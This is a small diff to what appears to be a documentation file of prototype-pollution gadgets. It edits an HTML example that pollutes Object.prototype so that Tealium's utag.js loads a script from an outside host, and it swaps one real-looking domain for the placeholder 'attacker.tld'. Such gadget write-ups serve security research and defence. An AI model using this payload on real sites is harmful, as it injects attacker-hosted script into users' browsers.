@@ -70,7 +70,7 @@ https://tags.tiqcdn.com/utag/tealium-solutions/main/prod/utag.js
 ```html
 <script>
   Object.prototype.attrs = {src:1}
-  Object.prototype.src='https://blackfan.ru/j.js'
+  Object.prototype.src='https://attacker.tld/js.js'
 </script>
 <script src=https://tags.tiqcdn.com/utag/tealium-solutions/main/prod/utag.js></script>
 ```
